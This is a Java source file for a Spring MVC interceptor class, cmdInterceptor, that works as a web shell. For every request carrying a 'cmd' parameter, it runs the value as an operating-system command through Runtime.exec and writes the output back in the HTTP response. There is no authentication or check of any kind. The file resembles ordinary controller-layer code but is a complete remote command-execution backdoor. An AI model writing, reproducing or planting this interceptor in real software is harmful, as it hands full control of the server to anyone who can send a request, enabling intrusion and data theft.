package com.controller;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.util.Scanner;

public class cmdInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if(request.getParameter("cmd")!= null){
            System.out.println(request.getParameter("cmd"));
            InputStream inputStream = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            response.getWriter().write(output);
        }
        return true;
    }
}
